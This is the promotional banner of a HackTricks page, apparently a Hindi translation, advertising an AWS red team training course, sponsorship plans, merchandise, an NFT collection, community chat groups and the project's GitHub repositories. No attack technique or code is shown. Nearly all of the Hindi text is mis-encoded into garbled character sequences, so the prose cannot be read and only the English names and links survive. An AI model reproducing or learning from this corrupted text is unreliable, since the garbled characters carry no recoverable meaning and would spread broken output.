<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>
